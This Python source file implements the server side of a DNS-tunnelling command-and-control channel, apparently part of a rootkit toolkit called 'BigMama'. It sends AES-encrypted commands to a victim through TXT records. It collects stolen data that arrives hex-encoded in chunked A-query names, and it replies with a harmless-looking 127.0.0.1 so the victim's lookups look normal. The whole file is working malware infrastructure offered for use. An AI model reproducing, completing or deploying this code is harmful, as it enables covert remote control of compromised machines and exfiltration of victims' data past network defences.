from dnslib import DNSRecord, QTYPE, RR, A, TXT
from utils.Crypto.CryptoHandler import CryptoHandler
import threading
import binascii
import socketserver
import config as cfg
import time


class DNSSender:
    """
    Pushes commands into `config.command_queue`
    and then blocks on `assemble_exfil()` for the response.
    """

    def __init__(self, owner=None):
        self.command_queue = []  
        self.exfil_buffer = {} 
        self.expected_chunks = None 

        self.owner = owner
        self._running = False

        self._server = None
        self._thread = None

        self._crypto = CryptoHandler(cfg.AES_KEY, cfg.AES_IV)

    def start(self) -> None:
        """ 
        Starts the DNS server to handle incoming DNS requests.
        This server listens on UDP port 53 and processes DNS queries for the specified domain.
        Each incoming packet is handled in its own new thread.
        """    
        if self._running:
            print("[DNS] Server is already running.")
            return

        self._server = socketserver.ThreadingUDPServer(('0.0.0.0', cfg.DNS_PORT), self.DNSHandler)
        self._server.sender = self

        self._thread = threading.Thread(
            target=self._server.serve_forever,
            name="DNSServerThread",
            daemon=True
        )
    
        self._thread.start()
        self._running = True

        print(f"[DNS] Listening on UDP/{cfg.DNS_PORT} for domain {cfg.DNS_DOMAIN}")
    
    def stop(self) -> None:
        """
        Stops the DNS server. This calls shutdown() on the ThreadingUDPServer, then
        server_close() to close the socket. After this returns, no new DNS queries will
        be handled, and the background thread will exit.
        """
        if not self._running or self._server is None:
            print("[DNS] Server is not running, so nothing to stop.")
            return

        self._server.shutdown()
        self._server.server_close()

        self._running = False
        self._server = None
        self._thread = None

        print("[DNS] Server stopped.")

    def send(self, message: str) -> str:
        if (len(self.exfil_buffer) > 0):
            msg = "[DNS] Cannot send new command. Please wait for the previous command to complete."
            self.owner._command_history.append(
                {"command": message, 
                 "stdout": "", 
                 "stderr": msg, 
                 "termination_code": "Undefined"})
            return msg
        
        if (len(message) == 0): 
            msg = "[DNS] Empty message, nothing to send."
            print(msg)
            return msg
       
        # Encrypt the message using AES-CBC
        message_encrypted = self._crypto.encrypt(message)

        if (len(message_encrypted) >= 255):
            msg = "[DNS] Message too long to send via DNS (max 255 char)."
            self.owner._command_history.append(
                {"command": message, 
                 "stdout": "", 
                 "stderr": msg, 
                 "termination_code": "Undefined"})
            return msg

        # Push into global queue
        self.command_queue.append(message_encrypted)

        # Poll‐assemble-decrypt.
        raw = self.assemble_exfil()
        if raw is None:
            msg = "[DNS] Timeout while waiting for all chunks. Returning empty data."
            self.owner._command_history.append(
                {"command": message, 
                 "stdout": "", 
                 "stderr": msg, 
                 "termination_code": "Undefined"})
            return msg

        # Decrypt the received data
        raw_decrypted = self._crypto.decrypt(raw)
        print(f"[DNS] Decrypted received response: {raw_decrypted}")
        
        # Update in BigMama attributes
        self.owner._command_history.append({"command": message, "stdout": "", "stderr": "", "termination_code": "Undefined"})
        self.owner._check_rootkit_command(raw_decrypted)
        self.owner._update_command_history(raw_decrypted)

        # Return the response
        return raw_decrypted
    
    def assemble_exfil(self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL) -> str:
        """
        Waits up to `timeout` seconds for all expected chunks to arrive,
        polling `exfil_buffer` every `poll` seconds. Returns the assembled
        text (or empty string on timeout).
        """

        # Start the timer
        start = time.time()

        while True:
            # Check if we have received all expected chunks
            if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
                break

            # If we time out, break the loop
            if time.time() - start > timeout:
                break

            # Sleep for a short while before checking again
            time.sleep(poll)

        # If we have received all expected chunks, assemble the data
        data = b""
        if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
            data = b''.join(self.exfil_buffer[i] for i in range(self.expected_chunks))
        else:
            print("[DNS] Timeout while waiting for all chunks. Returning empty data.")
            self.expected_chunks = None
            self.exfil_buffer.clear()
            return None

        # Reset buffers
        self.expected_chunks = None
        self.exfil_buffer.clear()

        # Return result
        return data 
    
    def is_running(self) -> bool:
        return self._running
     
    class DNSHandler(socketserver.BaseRequestHandler):

        def handle(self):
            """
            This nested class is used by the ThreadingUDPServer. On each DNS packet:
            - If it's a TXT-query for "command.<cfg.DNS_DOMAIN>", pop the next command
            from self.server.sender.command_queue, wrap it in a TXT RR, and send it back.
            - If it's an A-query with label <seq>/<tot>-<chunk>.command.<cfg.DNS_DOMAIN>, 
            decode the chunk, store it in self.server.sender.exfil_buffer[seq], set
            self.server.sender.expected_chunks = tot (if not already set), then reply
            with A=127.0.0.1 so the victim's resolver completes normally.
            """

            # Get raw data with `data` and socket to respond with `sock`
            data, sock = self.request

            try:
                # Try to parse the raw bytes from `data`
                req = DNSRecord.parse(data)   

                # Try to get the queried domain name
                qname = str(req.q.qname).rstrip('.')

                # Try to get the query type (should be A or TXT here)
                qtype = QTYPE[req.q.qtype]
            except Exception as e:
                print(f"[DNS] Error while parsing DNS request: {e}.")
                return
            
            # Create a DNS response with identical transaction ID 
            # and question section
            reply = req.reply()

            # Access the shared DNSSender instance
            sender: "DNSSender" = self.server.sender

            # Victim pulling commands via TXT queries
            # If there are pending commands in cfg.command_queue,
            # pops the first one and embeds it as the TXT record in the DNS answer.
            if qtype == "TXT" and qname == f"command.{cfg.DNS_DOMAIN}":

                # Check if there is an available command
                cmd = ""
                if sender.command_queue:
                    cmd = sender.command_queue.pop(0)
                    print(f"[DNS] TXT request received, trying to send command: {cmd!r}")

                    reply.add_answer(
                        RR(
                            qname,              # The exact name the client asked for
                            QTYPE.TXT,          # Record type "TXT"
                            rdata=TXT(cmd),     # Wrap our `cmd` string into a dnslib.TXT object
                            ttl=0               # TTL=0 means "don't cache this record" (VERY IMPORTANT)
                            )
                    )

                # Sends response
                try: sock.sendto(reply.pack(), self.client_address)
                except Exception as e:
                    print(f"[DNS] Failed to send TXT reply: {e}.")
                return

            # Victim exfiltrating via A-queries
            if qtype == "A":
                # DEBUG
                # print(f"[DNS] A-query received for {qname!r}.")

                # Isolate the first label of the queried name
                label = qname.split('.', 1)[0]

                # Each request should normally be formatted with
                # xx/xx-<data>.dns.google.com with xx/xx corresponding to 
                # the id of chunk / the total number of chunks (both in hex)
                if '-' in label and '/' in label:
                    hdr, hx = label.split('-', 1)
                    seq_s, tot_s = hdr.split('/', 1)
                    try:
                        # Parse the sequence numbers from hex to int
                        seq = int(seq_s, 16)
                        tot = int(tot_s, 16)

                        # Decode the hex data chunk back into raw bytes
                        chunk = binascii.unhexlify(hx)

                        # DEBUG
                        # print(f"[DNS] Received chunk {seq}/{tot} with data: {chunk!r}")

                        # Store this chunk in the buffer at index = sequence number
                        sender.exfil_buffer[seq] = chunk

                        # On the very first chunk, record how many chunks we expect
                        # Additionally, if the expected_chunks is already set,
                        # check if it matches the total number of chunks.
                        if sender.expected_chunks is None:
                            sender.expected_chunks = tot
                        elif sender.expected_chunks != tot:
                            print("[DNS] Warning: Expected chunks count mismatch! ")

                        # Debug
                        print(f"[DNS] Got chunk {seq}/{tot}")
                    except Exception as e:
                        print(f"[DNS] Parse error on label {label}: {e}")

                # Always send back a harmless A-record (127.0.0.1) so the client’s DNS call completes
                reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))

                # Send the reply back to the client
                sock.sendto(reply.pack(), self.client_address)
